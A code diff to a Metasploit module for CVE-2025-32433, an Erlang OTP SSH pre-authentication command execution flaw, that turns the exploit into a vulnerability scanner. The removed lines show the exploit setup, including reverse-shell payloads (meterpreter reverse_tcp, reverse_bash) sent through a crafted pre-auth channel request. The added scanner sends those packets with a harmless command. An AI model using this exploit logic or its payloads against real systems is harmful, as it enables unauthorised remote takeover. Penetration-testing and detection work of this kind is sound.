@@ -3,24 +3,20 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-class MetasploitModule < Msf::Exploit::Remote
-  Rank = ExcellentRanking
-  prepend Msf::Exploit::Remote::AutoCheck
-  include Msf::Exploit::Remote::CheckModule
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => 'Erlang OTP Pre-Auth RCE',
+        'Name' => 'Erlang OTP Pre-Auth RCE Scanner',
         'Description' => %q{
-          This module exploits CVE-2025-32433, a pre-authentication vulnerability in Erlang-based SSH servers
-          that allows remote command execution. By sending crafted SSH packets, it executes a Metasploit
-          payload to establish a reverse shell on the target system.
-
-          The exploit leverages a flaw in the SSH protocol handling to execute commands via the Erlang `os:cmd`
-          function without requiring authentication.
+          This module scans for CVE-2025-32433, a pre-authentication vulnerability in Erlang-based SSH servers
+          that allows remote command execution. It identifies vulnerable targets by connecting to the SSH service,
+          checking for an Erlang-specific banner, and sending a crafted packets to test the server's response.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -35,40 +31,11 @@ class MetasploitModule < Msf::Exploit::Remote
           ['URL', 'https://platformsecurity.com/blog/CVE-2025-32433-poc'],
           ['URL', 'https://github.com/ProDefense/CVE-2025-32433']
         ],
-        'Platform' => ['linux', 'unix'],
-        'Arch' => [ARCH_CMD],
-        'DefaultOptions' => {
-          'CheckModule' => 'auxiliary/scanner/ssh/ssh_erlangotp'
-        },
-        'Targets' => [
-          [
-            'Linux Command', {
-              'Platform' => 'linux',
-              'Arch' => ARCH_CMD,
-              'Type' => :linux_cmd,
-              'DefaultOptions' => {
-                'PAYLOAD' => 'cmd/linux/https/x64/meterpreter/reverse_tcp'
-              }
-            }
-          ],
-          [
-            'Unix Command', {
-              'Platform' => 'unix',
-              'Arch' => ARCH_CMD,
-              'Type' => :unix_cmd,
-              'DefaultOptions' => {
-                'PAYLOAD' => 'cmd/unix/reverse_bash'
-              }
-            }
-          ]
-        ],
-        'Privileged' => false,
         'DisclosureDate' => '2025-04-16',
-        'DefaultTarget' => 0,
         'Notes' => {
           'Stability' => [CRASH_SAFE],
-          'Reliability' => [REPEATABLE_SESSION],
-          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
+          'Reliability' => [],
+          'SideEffects' => [IOC_IN_LOGS]
         }
       )
     )
@@ -146,18 +113,19 @@ class MetasploitModule < Msf::Exploit::Remote
     [s_bytes.length].pack('N') + s_bytes
   end
 
-  def exploit
-    print_status(message('Starting exploit for CVE-2025-32433'))
+  def run_host(target_host)
     connect
 
-    print_status(message('Sending SSH banner...'))
     sock.put("SSH-2.0-OpenSSH_8.9\r\n")
+    banner = sock.get_once(1024, 10)
+    unless banner
+      print_status(message('No banner received'))
+      return Exploit::CheckCode::Unknown
+    end
 
-    banner = sock.get_once(1024)
-    if banner
-      print_good(message("Received banner: #{banner.strip}"))
-    else
-      fail_with(Failure::Unknown, 'No banner received')
+    unless banner.to_s.downcase.include?('erlang')
+      print_status(message("Not an Erlang SSH service: #{banner.strip}"))
+      return Exploit::CheckCode::Safe
     end
     sleep(0.5)
 
@@ -166,33 +134,49 @@ class MetasploitModule < Msf::Exploit::Remote
     sock.put(pad_packet(kex_packet, 8))
     sleep(0.5)
 
+    response = sock.get_once(1024, 5)
+    unless response
+      print_status(message("Detected Erlang SSH service: #{banner.strip}, but no response to KEXINIT"))
+      return Exploit::CheckCode::Detected
+    end
+
     print_status(message('Sending SSH_MSG_CHANNEL_OPEN...'))
     chan_open = build_channel_open(0)
     sock.put(pad_packet(chan_open, 8))
     sleep(0.5)
 
     print_status(message('Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...'))
-    chan_req = build_channel_request(0, payload.encoded)
+    chan_req = build_channel_request(0, 'blah')
     sock.put(pad_packet(chan_req, 8))
+    sleep(0.5)
 
     begin
-      response = sock.get_once(1024, 5)
-      if response
-        vprint_status(message("Received response: #{response.unpack('H*').first}"))
-        print_good(message('Payload sent successfully'))
-      else
-        print_status(message('No response within timeout period (which is expected)'))
-      end
-    rescue Rex::TimeoutError
-      print_status(message('No response within timeout period (which is expected)'))
+      sock.get_once(1024, 5)
+    # when the target is vulnerable you get at this step: rescue Rex::TimeoutError
+    rescue EOFError
+      # when the target is NOT vulnerable/patched at this step.
+      return Exploit::CheckCode::Safe
     end
     sock.close
+
+    note = 'The target is vulnerable to CVE-2025-32433.'
+    print_good(message(note))
+    report_vuln(
+      host: target_host,
+      name: name,
+      refs: references,
+      info: note
+    )
+
+    Exploit::CheckCode::Vulnerable
   rescue Rex::ConnectionError
-    fail_with(Failure::Unreachable, 'Failed to connect to the target')
+    print_error(message('Failed to connect to the target'))
+    Exploit::CheckCode::Unknown
   rescue Rex::TimeoutError
-    fail_with(Failure::TimeoutExpired, 'Connection timed out')
-  rescue StandardError => e
-    fail_with(Failure::Unknown, "Error: #{e.message}")
+    print_error(message('Connection timed out'))
+    Exploit::CheckCode::Unknown
+  ensure
+    disconnect unless sock.nil?
   end
 
 end
